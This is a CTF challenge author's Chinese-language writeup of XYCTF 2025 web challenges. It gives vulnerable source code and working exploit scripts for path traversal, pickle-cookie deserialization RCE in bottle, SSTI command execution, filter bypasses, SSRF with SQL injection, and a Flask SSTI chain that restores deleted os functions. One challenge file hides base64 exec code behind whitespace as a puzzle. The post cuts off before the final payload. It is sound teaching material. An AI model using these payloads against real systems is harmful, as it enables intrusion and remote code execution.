---
title: "XYCTF 2025 出题人wp LamentXU"
date: 2025-03-08 00:40
updated: 2025-03-08 00:40
categories: "CTF"
tags:
  - "CTF"
  - "Web Security"
  - "Writeup"
  - "Python"
  - "Reverse"
description: "第一次给大比赛出题，出的有点烂，希望师傅们见谅&gt;_&lt; 提示：本次为完全公益性质的出题。授权任何人在任何平台复现，甚至于商用。但请务必注明作者ID：LamentXU 本次题目附件，docker，题解全部在github仓库公开，方便师傅们复现。 WEB-Signin 出题灵感 这两天翻bot"
original_url: "https://www.cnblogs.com/LAMENTXU/articles/18730353"
---
第一次给大比赛出题，出的有点烂，希望师傅们见谅>\_<

**提示：本次为完全公益性质的出题。授权任何人在任何平台复现，甚至于商用。但请务必注明作者ID：`LamentXU`**

本次题目附件，docker，题解全部在github仓库公开，方便师傅们复现。

# WEB-Signin

## 出题灵感

这两天翻bottle源码偶然发现bottle导入了pickle。然后看了看大概是在鉴权的时候用pickle反序列化了session（不理解为啥不用json）。只要知道了密钥就可以任意反序列化。

所以这题就诞生了，作为一个真正的签到我没搞多难。密钥读取就是一个很基础的路径穿越绕过。

## 题解

```
# -*- encoding: utf-8 -*-
'''
@File    :   main.py
@Time    :   2025/03/28 22:20:49
@Author  :   LamentXU 
'''
'''
flag in /flag_{uuid4}
'''
from bottle import Bottle, request, response, redirect, static_file, run, route
try:
    with open('../../secret.txt', 'r') as f:
        secret = f.read()
except:
    print("No secret file found, using default secret")
    secret = "secret"
app = Bottle()
@route('/')
def index():
    return '''HI'''
@route('/download')
def download():
    name = request.query.filename
    if '../../' in name or name.startswith('/') or name.startswith('../') or '\\' in name:
        response.status = 403
        return 'Forbidden'
    with open(name, 'rb') as f:
        data = f.read()
    return data

@route('/secret')
def secret_page():
    try:
        session = request.get_cookie("name", secret=secret)
        if not session or session["name"] == "guest":
            session = {"name": "guest"}
            response.set_cookie("name", session, secret=secret)
            return 'Forbidden!'
        if session["name"] == "admin":
            return 'The secret has been deleted!'
    except:
        return "Error!"
run(host='0.0.0.0', port=5000, debug=False)
```

### 路径穿越

可以看到存在download路由：

```
def download():
    name = request.query.filename
    if '../../' in name or name.startswith('/') or name.startswith('../') or '\\' in name:
        response.status = 403
        return 'Forbidden'
    with open(name, 'rb') as f:
        data = f.read()
    return data
```

这里只是禁止了两个连在一起的`../../`和开头的`../`直接用`./`绕过即可。payload：

```
/download?filename=./.././.././../secret.txt
```

读取到secret.txt

```
Hell0_H@cker_Y0u_A3r_Sm@r7
```

### pickle反序列化

可以看到有一个secret理由，如下：

```
def secret_page():
    try:
        session = request.get_cookie("name", secret=secret)
        if not session or session["name"] == "guest":
            session = {"name": "guest"}
            response.set_cookie("name", session, secret=secret)
            return 'Forbidden!'
        if session["name"] == "admin":
            return 'The secret has been deleted!'
    except:
        return "Error!"
```

我们来看get\_cookie的逻辑：

```
    def get_cookie(self, key, default=None, secret=None, digestmod=hashlib.sha256):
        """ Return the content of a cookie. To read a `Signed Cookie`, the
            `secret` must match the one used to create the cookie (see
            :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing
            cookie or wrong signature), return a default value. """
        value = self.cookies.get(key)
        if secret:
            # See BaseResponse.set_cookie for details on signed cookies.
            if value and value.startswith('!') and '?' in value:
                sig, msg = map(tob, value[1:].split('?', 1))
                hash = hmac.new(tob(secret), msg, digestmod=digestmod).digest()
                if _lscmp(sig, base64.b64encode(hash)):
                    dst = pickle.loads(base64.b64decode(msg))
                    if dst and dst[0] == key:
                        return dst[1]
            return default
        return value or default
```

可以看到只要签名对的上就能直接进pickle的反序列化。

使用bottle的`cookie_encode`生成payload之后拿着这个payload去改session的值，并将请求发送到/secret。随后可以把回显外带（不出网）。

exp：

```
from bottle import cookie_encode
import os
import requests
secret = "Hell0_H@cker_Y0u_A3r_Sm@r7"

class Test:
    def __reduce__(self):
        return (eval, ("""__import__('os').system('cp /f* ./2.txt')""",))

exp = cookie_encode(
    ('session', {"name": [Test()]}),
    secret
)

requests.get('http://gz.imxbt.cn:20458/secret', cookies={'name': exp.decode()})
```

访问2.txt直接打到flag。

`flag{We1c0me_t0_XYCTF_2o25!The_secret_1s_L@men7XU_L0v3_u!}`

# WEB-出题人已疯

## 出题灵感

由VNCTF的`学生姓名登记系统`改的。把多行改成一行，长度限制稍微放宽了一点点。

```
# -*- encoding: utf-8 -*-
'''
@File    :   app.py
@Time    :   2025/03/29 15:52:17
@Author  :   LamentXU 
'''
import bottle
'''
flag in /flag
'''
@bottle.route('/')
def index():
    return 'Hello, World!'
@bottle.route('/attack')
def attack():
    payload = bottle.request.query.get('payload')
    if payload and len(payload) < 25 and 'open' not in payload and '\\' not in payload:
        return bottle.template('hello '+payload)
    else:
        bottle.abort(400, 'Invalid payload')
if __name__ == '__main__':
    bottle.run(host='0.0.0.0', port=5000)
```

## 题解

其实bottle的SSTI可以直接访问到内部类。所以易得：

```
import requests

url = 'http://eci-2zeeal6ndgee1yfe98tl.cloudeci1.ichunqiu.com:5000/attack'

payload = "__import__('os').system('cat /f*>123')"

p = [payload[i:i+3] for i in range(0,len(payload),3)]
flag = True
for i in p:
    if flag:
        tmp = f'\n%import os;os.a="{i}"'
        flag = False
    else:
        tmp = f'\n%import os;os.a+="{i}"'
    r = requests.get(url,params={"payload":tmp})

r = requests.get(url,params={"payload":"\n%import os;eval(os.a)"})
r = requests.get(url,params={"payload":"\n%include('123')"}).text
print(r)
```

直接往os里塞字符。随后一起拿出来exec。这样子就可以实现SSTI。

`flag{L@men7XU_d0es_n0t_w@nt_t0_g0_t0_scho01}`

# WEB-出题人又疯

## 出题灵感

禁止了更多的字符。这下没法用之前的方法做了

## 题解

```
# -*- encoding: utf-8 -*-
'''
@File    :   app.py
@Time    :   2025/03/29 15:52:17
@Author  :   LamentXU 
'''
import bottle
'''
flag in /flag
'''
@bottle.route('/')
def index():
    return 'Hello, World!'
blacklist = [
    'o', '\\', '\r', '\n', 'os', 'import', 'eval', 'exec', 'system', ' ', ';', 'read'
]
@bottle.route('/attack')
def attack():
    payload = bottle.request.query.get('payload')
    if payload and len(payload) < 25 and all(c not in payload for c in blacklist):
        print(payload)
        return bottle.template('hello '+payload)
    else:
        bottle.abort(400, 'Invalid payload')
if __name__ == '__main__':
    bottle.run(host='0.0.0.0', port=5000)
```

python中有如下特性：

![](/images/migrated/18730353/01.png)

可以用斜体文字绕过。在此例里也是一样的。

payload：

```
ºpen('/flag').read()
```

然后发现报错。（（

本地调试一下就知道了。URL传参的时候把斜体的𝓸解析成了两个字符。如图：

![](/images/migrated/18730353/02.png)

可以看到斜体的o被解析成了%C2%BA

其实这里是一个URL解码的小坑。一个%BA就足够了。我们删除%C2即可。

对字符a，同理。替换为%aa

payload:

```
/attack?payload={{%BApen(%27/flag%27).re%aad()}}
```

解出：

`flag{L@men7XU_d0es_n0t_w@nt_t0_t@ke_@ny_f**king_exams}`

### 更多？

[https://www.cnblogs.com/LAMENTXU/articles/18805019](https://www.cnblogs.com/LAMENTXU/articles/18805019)

# WEB-Fate

签到题。但为什么那么多人喷我这道题出的不是签到www。

## 出题灵感

### json反序列化&python格式化字符串漏洞

这部分改编自CakeCTF 2023的[country-db](https://alpacahack.com/ctfs/cakectf-2023/challenges/country-db)

原题为：

```
#!/usr/bin/env python3
import flask
import sqlite3

app = flask.Flask(__name__)

def db_search(code):
    with sqlite3.connect('database.db') as conn:
        cur = conn.cursor()
        cur.execute(f"SELECT name FROM country WHERE code=UPPER('{code}')")
        found = cur.fetchone()
    return None if found is None else found[0]

@app.route('/')
def index():
    return flask.render_template("index.html")

@app.route('/api/search', methods=['POST'])
def api_search():
    req = flask.request.get_json()
    if 'code' not in req:
        flask.abort(400, "Empty country code")

    code = req['code']
    if len(code) != 2 or "'" in code:
        flask.abort(400, "Invalid country code")

    name = db_search(code)
    if name is None:
        flask.abort(404, "No such country")

    return {'name': name}

if __name__ == '__main__':
    app.run(debug=True)
```

一个拥有几乎不可能绕过的waf的SQL注入题。

我们可以看到，这题是利用`flask.request.get_json()`进行传参，这个方法没有对传入的类型做检查。因此，我们可以传入非字符串类型的变量。

而在python中，当我们使用f-string直接传入非字符串参数时，就会被强转为字符串。

如下：

![](/images/migrated/18730353/03.png)

这也被称为**python格式化字符串漏洞**。

因此，这题可以这样解：

```
{"code":["1') UNION SELECT FLAG FROM FLAG --","1"]}
```

传入的code为列表，因而可以通过waf（len为2，没有`'`元素）随后直接被f-string强转，拼入sql语句，如下：

```
SELECT name FROM country WHERE code=UPPER('["1') UNION SELECT FLAG FROM FLAG --","1"]')
```

就可以完成一次SQL注入。拿到FLAG表里的FLAG值。

### SSRF中URL二次编码绕过

参考了TCP1PCTF的Hacked题目：[https://www.cnblogs.com/LAMENTXU/articles/18461268](https://www.cnblogs.com/LAMENTXU/articles/18461268)

几乎是一样的trick。这里因为waf在ssrf前，所以可以使用二次URL编码来传入abcdef。且abcdef的hex值都为数字，不会出现被ban的字母。

## 题解

```
#!/usr/bin/env python3
import flask
import sqlite3
import requests
import string
import json
app = flask.Flask(__name__)
blacklist = string.ascii_letters
def binary_to_string(binary_string):
    if len(binary_string) % 8 != 0:
        raise ValueError("Binary string length must be a multiple of 8")
    binary_chunks = [binary_string[i:i+8] for i in range(0, len(binary_string), 8)]
    string_output = ''.join(chr(int(chunk, 2)) for chunk in binary_chunks)
    
    return string_output

@app.route('/proxy', methods=['GET'])
def nolettersproxy():
    url = flask.request.args.get('url')
    if not url:
        return flask.abort(400, 'No URL provided')
    
    target_url = "http://lamentxu.top" + url
    for i in blacklist:
        if i in url:
            return flask.abort(403, 'I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~')
    if "." in target_url:
        return flask.abort(403, 'No ssrf allowed')
    response = requests.get(target_url)

    return flask.Response(response.content, response.status_code)
def db_search(code):
    with sqlite3.connect('database.db') as conn:
        cur = conn.cursor()
        cur.execute(f"SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER('{code}')))))))")
        found = cur.fetchone()
    return None if found is None else found[0]

@app.route('/')
def index():
    print(flask.request.remote_addr)
    return flask.render_template("index.html")

@app.route('/1337', methods=['GET'])
def api_search():
    if flask.request.remote_addr == '127.0.0.1':
        code = flask.request.args.get('0')
        if code == 'abcdefghi':
            req = flask.request.args.get('1')
            try:
                req = binary_to_string(req)
                print(req)
                req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;)
            except:
                flask.abort(400, "Invalid JSON")
            if 'name' not in req:
                flask.abort(400, "Empty Person's name")

            name = req['name']
            if len(name) > 6:
                flask.abort(400, "Too long")
            if '\'' in name:
                flask.abort(400, "NO '")
            if ')' in name:
                flask.abort(400, "NO )")
            """
            Some waf hidden here ;)
            """

            fate = db_search(name)
            if fate is None:
                flask.abort(404, "No such Person")

            return {'Fate': fate}
        else:
            flask.abort(400, "Hello local, and hello hacker")
    else:
        flask.abort(403, "Only local access allowed")

if __name__ == '__main__':
    app.run(debug=True)
```

通过`init_db.py`我们可以知道。flag在LamentXU对应的值里。但是LamentXU的长度>6，因此不能直接查询。

```
Fate = [
    ('JOHN', '1994-2030 Dead in a car accident'),
    ('JANE', '1990-2025 Lost in a fire'),
    ('SARAH', '1982-2017 Fired by a government official'),
    ('DANIEL', '1978-2013 Murdered by a police officer'),
    ('LUKE', '1974-2010 Assassinated by a military officer'),
    ('KAREN', '1970-2006 Fallen from a cliff'),
    ('BRIAN', '1966-2002 Drowned in a river'),
    ('ANNA', '1962-1998 Killed by a bomb'),
    ('JACOB', '1954-1990 Lost in a plane crash'),
    ('LAMENTXU', r'2024 Send you a flag flag{fake}')
]
```

也就是在CakeCTF的那道题上套了个SSRF的环节。

我为了让json这部分更明显甚至去除了`flask.request.get_json()`而是使用了`json.loads()`，甚至标了注释。题目到这里应该是变得比较简单了。

我们一个环节一个环节来。

首先看SSRF部分。

1.在前面加入lamentxu.top，这个可以用@来绕过。  
2.禁止了所有字母和`.`，那么我们使用2130706433来表示127.0.0.1。  
3.必须要传入参数0为abcdef。使用二次URL编码绕过。

接下来就是SQL注入部分

使用上文提到的办法即可，但是这里限制了列表和元组，使用字典。

传入数据为：

```
{"name":{"'))))))) UNION SELECT FATE FROM FATETABLE WHERE NAME='LAMENTXU' --":1}}
```

拼接后的sql语句为

```
SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER('{"'))))))) UNION SELECT FATE FROM FATETABLE WHERE NAME='LAMENTXU' --":1}')))))))
```

即可成功注入。

接下来将传入的数据编码，脚本如下：

```
def string_to_binary(input_string):
    binary_list = [format(ord(char), '08b') for char in input_string]
    binary_string = ''.join(binary_list)
    return binary_string
print(string_to_binary("""{"name":{"'))))))) UNION SELECT FATE FROM FATETABLE WHERE NAME='LAMENTXU' --":1}}"""))
```

然后打就完了。

```
GET /proxy?url=@2130706433:8080/1337?1=011110110010001001101110011000010110110101100101001000100011101001111011001000100010011100101001001010010010100100101001001010010010100100101001001000000101010101001110010010010100111101001110001000000101001101000101010011000100010101000011010101000010000001000110010000010101010001000101001000000100011001010010010011110100110100100000010001100100000101010100010001010101010001000001010000100100110001000101001000000101011101001000010001010101001001000101001000000100111001000001010011010100010100111101001001110100110001000001010011010100010101001110010101000101100001010101001001110010000000101101001011010010001000111010001100010111110101111101%260=%2561%2562%2563%2564%2565%2566%2567%2568%2569
```

![](/images/migrated/18730353/04.png)

`flag{Do4t_bElIevE_in_FatE_3EcaUse_f3Te_rESt_1n_OuR_hAnd}`

其实还是套了。但是我觉得web签到应该上点强度不然显得我很菜>\_< 所以就整麻烦了一些，其实不是很难。

# WEB-Now you see me 1

## 出题灵感

这题是挨骂最惨的题了www。其中的文字灵感来自惊天魔盗团。

为什么要出这题呢，是因为现在SSTI fenjing盛行，很多CTFER都忽略了最基本的SSTI原理。fenjing一旦失灵了就不会了。

这题用的是一种比较罕见的技术来打。并不是一个很简单的SSTI题目，fenjing梭不出来。

这题的思路大致为使用flask的request.endpoint找request.data，然后在请求体里传参构造任意字符。

## 题解

我们来看源码：

```
# -*- encoding: utf-8 -*-
'''
@File    :   app.py
@Time    :   2024/12/27 18:27:15
@Author  :   LamentXU 

运行，然后你会发现启动了一个flask服务。这是怎么做到的呢？
注：本题为彻底的白盒题，服务端代码与附件中的代码一模一样。不用怀疑附件的真实性。
'''
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(__import__("base64").b64decode('IyBZT1UgRk9VTkQgTUUgOykKIyAtKi0gZW5jb2Rpbmc6IHV0Zi04IC0qLQonJycKQEZpbGUgICAgOiAgIHNyYy5weQpAVGltZSAgICA6ICAgMjAyNS8wMy8yOSAwMToxMDozNwpAQXV0aG9yICA6ICAgTGFtZW50WFUgCicnJwojIFNvbWV0aGluZyB0byBub3RlOiBJZiB5b3UgZ2V0IHRoZSBmaW5hbCAiZmxhZyIgYnV0IGl0cyBub3QgZXZlbiBhIHRleHQgZmlsZS4gcGxlYXNlIHRoaW5rIGFib3V0IHRoaXM6IAojIE1hZ2ljaWFucyBhbHdheXMgdXNlIHNvbWV0aGluZyB0byBoaWRlIHRoZWlyIHRydXRoLiAKJycnCllvdXIgZmluYWwgc2VjcmV0IGlzOiAoc29tZXRoaW5nIGhpZGRlbiBiZWxvdyB0aGlzIGxpbmUpCgoJICAgICAJICAgICAgCSAgICAgCgkgCSAgICAgCSAgCSAgIAkgICAgICAgCSAgICAgICAJIAkgICAgCSAgCiAgCSAgICAJCQkgCQkgICAgICAgCSAKJycnCmltcG9ydCBmbGFzawppbXBvcnQgc3lzCmVuYWJsZV9ob29rID0gIEZhbHNlCmNvdW50ZXIgPSAwCmRlZiBhdWRpdF9jaGVja2VyKGV2ZW50LGFyZ3MpOgogICAgZ2xvYmFsIGNvdW50ZXIKICAgIGlmIGVuYWJsZV9ob29rOgogICAgICAgIGlmIGV2ZW50IGluIFsiZXhlYyIsICJjb21waWxlIl06CiAgICAgICAgICAgIGNvdW50ZXIgKz0gMQogICAgICAgICAgICBpZiBjb3VudGVyID4gNDoKICAgICAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcihldmVudCkKCmxvY2tfd2l0aGluID0gWwogICAgImRlYnVnIiwgImZvcm0iLCAiYXJncyIsICJ2YWx1ZXMiLCAKICAgICJoZWFkZXJzIiwgImpzb24iLCAic3RyZWFtIiwgImVudmlyb24iLAogICAgImZpbGVzIiwgIm1ldGhvZCIsICJjb29raWVzIiwgImFwcGxpY2F0aW9uIiwgCiAgICAnZGF0YScsICd1cmwnICwnXCcnLCAnIicsIAogICAgImdldGF0dHIiLCAiXyIsICJ7eyIsICJ9fSIsIAogICAgIlsiLCAiXSIsICJcXCIsICIvIiwic2VsZiIsIAogICAgImxpcHN1bSIsICJjeWNsZXIiLCAiam9pbmVyIiwgIm5hbWVzcGFjZSIsIAogICAgImluaXQiLCAiZGlyIiwgImpvaW4iLCAiZGVjb2RlIiwgCiAgICAiYmF0Y2giLCAiZmlyc3QiLCAibGFzdCIgLCAKICAgICIgIiwiZGljdCIsImxpc3QiLCJnLiIsCiAgICAib3MiLCAic3VicHJvY2VzcyIsCiAgICAiZ3xhIiwgIkdMT0JBTFMiLCAibG93ZXIiLCAidXBwZXIiLAogICAgIkJVSUxUSU5TIiwgInNlbGVjdCIsICJXSE9BTUkiLCAicGF0aCIsCiAgICAib3MiLCAicG9wZW4iLCAiY2F0IiwgIm5sIiwgImFwcCIsICJzZXRhdHRyIiwgInRyYW5zbGF0ZSIsCiAgICAic29ydCIsICJiYXNlNjQiLCAiZW5jb2RlIiwgIlxcdSIsICJwb3AiLCAicmVmZXJlciIsCiAgICAiVGhlIGNsb3NlciB5b3Ugc2VlLCB0aGUgbGVzc2VyIHlvdSBmaW5kLiJdIAogICAgICAgICMgSSBoYXRlIGFsbCB0aGVzZS4KYXBwID0gZmxhc2suRmxhc2soX19uYW1lX18pCkBhcHAucm91dGUoJy8nKQpkZWYgaW5kZXgoKToKICAgIHJldHVybiAndHJ5IC9IM2RkZW5fcm91dGUnCkBhcHAucm91dGUoJy9IM2RkZW5fcm91dGUnKQpkZWYgcjNhbF9pbnMxZGVfdGgwdWdodCgpOgogICAgZ2xvYmFsIGVuYWJsZV9ob29rLCBjb3VudGVyCiAgICBuYW1lID0gZmxhc2sucmVxdWVzdC5hcmdzLmdldCgnTXlfaW5zMWRlX3cwcjFkJykKICAgIGlmIG5hbWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBuYW1lLnN0YXJ0c3dpdGgoIkZvbGxvdy15b3VyLWhlYXJ0LSIpOgogICAgICAgICAgICAgICAgZm9yIGkgaW4gbG9ja193aXRoaW46CiAgICAgICAgICAgICAgICAgICAgaWYgaSBpbiBuYW1lOgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ05PUEUuJwogICAgICAgICAgICAgICAgZW5hYmxlX2hvb2sgPSBUcnVlCiAgICAgICAgICAgICAgICBhID0gZmxhc2sucmVuZGVyX3RlbXBsYXRlX3N0cmluZygneyMnK2Yne25hbWV9JysnI30nKQogICAgICAgICAgICAgICAgZW5hYmxlX2hvb2sgPSBGYWxzZQogICAgICAgICAgICAgICAgY291bnRlciA9IDAKICAgICAgICAgICAgICAgIHJldHVybiBhCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByZXR1cm4gJ015IGluc2lkZSB3b3JsZCBpcyBhbHdheXMgaGlkZGVuLicKICAgICAgICBleGNlcHQgUnVudGltZUVycm9yIGFzIGU6CiAgICAgICAgICAgIGNvdW50ZXIgPSAwCiAgICAgICAgICAgIHJldHVybiAnTk8uJwogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcmV0dXJuICdFcnJvcicKICAgIGVsc2U6CiAgICAgICAgcmV0dXJuICdXZWxjb21lIHRvIEhpZGRlbl9yb3V0ZSEnCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgaW1wb3J0IG9zCiAgICB0cnk6CiAgICAgICAgaW1wb3J0IF9wb3NpeHN1YnByb2Nlc3MKICAgICAgICBkZWwgX3Bvc2l4c3VicHJvY2Vzcy5mb3JrX2V4ZWMKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCiAgICBpbXBvcnQgc3VicHJvY2VzcwogICAgZGVsIG9zLnBvcGVuCiAgICBkZWwgb3Muc3lzdGVtCiAgICBkZWwgc3VicHJvY2Vzcy5Qb3BlbgogICAgZGVsIHN1YnByb2Nlc3MuY2FsbAogICAgZGVsIHN1YnByb2Nlc3MucnVuCiAgICBkZWwgc3VicHJvY2Vzcy5jaGVja19vdXRwdXQKICAgIGRlbCBzdWJwcm9jZXNzLmdldG91dHB1dAogICAgZGVsIHN1YnByb2Nlc3MuY2hlY2tfY2FsbAogICAgZGVsIHN1YnByb2Nlc3MuZ2V0c3RhdHVzb3V0cHV0CiAgICBkZWwgc3VicHJvY2Vzcy5QSVBFCiAgICBkZWwgc3VicHJvY2Vzcy5TVERPVVQKICAgIGRlbCBzdWJwcm9jZXNzLkNhbGxlZFByb2Nlc3NFcnJvcgogICAgZGVsIHN1YnByb2Nlc3MuVGltZW91dEV4cGlyZWQKICAgIGRlbCBzdWJwcm9jZXNzLlN1YnByb2Nlc3NFcnJvcgogICAgc3lzLmFkZGF1ZGl0aG9vayhhdWRpdF9jaGVja2VyKQogICAgYXBwLnJ1bihkZWJ1Zz1GYWxzZSwgaG9zdD0nMC4wLjAuMCcsIHBvcnQ9NTAwMCkK'))                                                                 
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")                                                                 
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
#...
```

可以看到中间藏了一段代码。这个是一个python中`;`忽略缩进的小特性，主要是为了让题目更有趣。

```
# YOU FOUND ME ;)
# -*- encoding: utf-8 -*-
'''
@File    :   src.py
@Time    :   2025/03/29 01:10:37
@Author  :   LamentXU 
'''
import flask
import sys
enable_hook =  False
counter = 0
def audit_checker(event,args):
    global counter
    if enable_hook:
        if event in ["exec", "compile"]:
            counter += 1
            if counter > 4:
                raise RuntimeError(event)

lock_within = [
    "debug", "form", "args", "values", 
    "headers", "json", "stream", "environ",
    "files", "method", "cookies", "application", 
    'data', 'url' ,'\'', '"', 
    "getattr", "_", "{{", "}}", 
    "[", "]", "\\", "/","self", 
    "lipsum", "cycler", "joiner", "namespace", 
    "init", "dir", "join", "decode", 
    "batch", "first", "last" , 
    " ","dict","list","g.",
    "os", "subprocess",
    "g|a", "GLOBALS", "lower", "upper",
    "BUILTINS", "select", "WHOAMI", "path",
    "os", "popen", "cat", "nl", "app", "setattr", "translate",
    "sort", "base64", "encode", "\\u", "pop", "referer",
    "The closer you see, the lesser you find."] 
        # I hate all these.
app = flask.Flask(__name__)
@app.route('/')
def index():
    return 'try /H3dden_route'
@app.route('/H3dden_route')
def r3al_ins1de_th0ught():
    global enable_hook, counter
    name = flask.request.args.get('My_ins1de_w0r1d')
    if name:
        try:
            if name.startswith("Follow-your-heart-"):
                for i in lock_within:
                    if i in name:
                        return 'NOPE.'
                enable_hook = True
                a = flask.render_template_string('{#'+f'{name}'+'#}')
                enable_hook = False
                counter = 0
                return a
            else:
                return 'My inside world is always hidden.'
        except RuntimeError as e:
            counter = 0
            return 'NO.'
        except Exception as e:
            return 'Error'
    else:
        return 'Welcome to Hidden_route!'

if __name__ == '__main__':
    import os
    try:
        import _posixsubprocess
        del _posixsubprocess.fork_exec
    except:
        pass
    import subprocess
    del os.popen
    del os.system
    del subprocess.Popen
    del subprocess.call
    del subprocess.run
    del subprocess.check_output
    del subprocess.getoutput
    del subprocess.check_call
    del subprocess.getstatusoutput
    del subprocess.PIPE
    del subprocess.STDOUT
    del subprocess.CalledProcessError
    del subprocess.TimeoutExpired
    del subprocess.SubprocessError
    sys.addaudithook(audit_checker)
    app.run(debug=False, host='0.0.0.0', port=5000)
```

可以看到有点吓人（bushi）

给了一个SSTI的利用点，有回显。

### SSTI request对象

直接去看waf。先考虑传统继承链。但是由于缺少`_`，只能去尝试构造字符`_`，但是由于限制了单双引号和一些重要字符，无法获取到`_`。传统继承链打不了。

注意到没有过滤request对象（除了request其他的入口类全给你ban了）。然后，可以发现request的常用逃逸参数（args，values这种）全被禁止。同时限死了单双引号，无法拼接，无法进行编码转换。只能去看开发手册找找request还有什么能用的。

我们翻到一篇博客：[https://chenlvtang.top/2021/03/31/SSTI进阶/](https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/)

![](/images/migrated/18730353/05.png)

发现其中提及的参数全部被ban。

因此，我们再往下深究，去找开发手册，我们能看到：

![](/images/migrated/18730353/06.png)

可以使用`request.endpoint`获取到当前路由的函数名，即`r3al_ins1de_th0ught`

从中，我们能获取字符'd', 'a', 't'

注意到可以拼接出data。进而获取`request.data`，再在请求体中传入任意字符进行绕过。至此，我们可以获得任意字符。

### importlib.reload

可以看到题目删除了RCE的方法。python2中可以使用reload函数对类进行重载，在python3中，这个函数搬到了importlib类里。可以以此重载到被删除的方法。

如下：

```
import os
import importlib
del os.system
importlib.reload(os)
os.system('whoami')
```

![](/images/migrated/18730353/07.png)

### audithook

至于audithook是用来防奇怪的非预期的，不必在意。使用reload会触发一次complie和exec，再加上render\_templete本身就有一次，一共正好4次。

### flask模板注释语句闭合

我们都知道在flask里`{#`和`#}`意味着注释语句。即，在这里面的内容不会被渲染，也不会被执行。

而在本题中我们的渲染语句为：

```
flask.render_template_string('{#'+f'{name}'+'#}')
```

正常渲染的话我们的语句会被注释掉。因此需要在语句的开头加入`#}`来闭合注释语句。

POC:

```
#}{%print(7*7)%}
```

### 最终利用

到此，我们已经可以构造任意字符，同时也可以恢复RCE类。我们依然使用request作入口类，通过继承链打RCE

总结如下：

1.`#}`闭合注释语句  
2.request.endpoint找request.data  
3.request.data从请求体中获取任意字符  
4.通过拼接字符打继承链找到importlib的reload。分别reload`os.popen`和`subprocess.Popen`  
5.通过request打继承链找os打RCE

利用脚本如下：

```
import re
payload = []
def generate_rce_command(cmd):
    global payload
    payloadstr = "{%set%0asub=request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('subprocess')%}{%set%0aso=request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')%}{%print(request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('importlib')|attr('reload')(sub))%}{%print(request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('importlib')|attr('reload')(so))%}{%print(so|attr('popen')('" + cmd + "')|attr('read')())%}"

    required_encoding = re.findall('\'([a-z0-9_ /\.]+)\'', payloadstr)
    # print(required_encoding)

    offset_a = 16
    offset_0 = 6

    encoded_payloads = {}

    arg_count = 0
    for i in required_encoding:
        print(i)
        if i not in encoded_payloads:
            p = []
            for j in i:
                if j == '_':
                    p.append('k.2')
                elif j == ' ':
                    p.append('k.3')
                elif j == '.':
                    p.append('k.4')
                elif j == '-':
                    p.append('k.5')
                elif j.isnumeric():
                    a = str(ord(j)-ord('0')+offset_0)
                    p.append(f'k.{a}')
                elif j == '/':
                    p.append('k.68')
                else:
                    a = str(ord(j)-ord('a')+offset_a)
                    p.append(f'k.{a}')
            arg_name = f'a{arg_count}'
            encoded_arg = '{%' + '%0a'.join(['set', arg_name , '=', '~'.join(p)]) + '%}'
            encoded_payloads[i] = (arg_name, encoded_arg)
            arg_count+=1
            payload.append(encoded_arg)
    # print(encoded_payloads)
    fully_encoded_payload = payloadstr
    for i in encoded_payloads.keys():
        if i in fully_encoded_payload:
            fully_encoded_payload = fully_encoded_payload.replace("'"+ i +"'", encoded_payloads[i][0])
    # print(fully_encoded_payload)
    payload.append(fully_encoded_payload)
command = "whoami"
payload.append(r'{%for%0ai%0ain%0arequest.endpoint|slice(1)%}')
word_data = ''
endpoint = 'r3al_ins1de_th0ught'
for i in 'data':
    word_data += 'i.' + str(endpoint.find(i)) + '~'
word_data = word_data[:-1] # delete the last '~'
# Now we have "data"
print("data: "+word_data)
payload.append(r'{%set%0adat='+word_data+'%}')
payload.append(r'{%for%0ak%0ain%0arequest|attr(dat)|string|slice(1)%0a%}')
generate_rce_command(command)
# payload.append(r'{%print(j)%}')
# Here we use the "data" to construct the payload
print('request body: _ .-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/')
# use chr() to convert the number to character
# hiahiahia~ Now we get all of the charset, SSTI go go go!

payload.append(r'{%endfor%}')
payload.append(r'{%endfor%}')
output = ''.join(payload)

print(r"Follow-your-heart-%23}"+output)
```

可以看到成功RCE

![](/images/migrated/18730353/08.png)

执行whoami的payload：

```
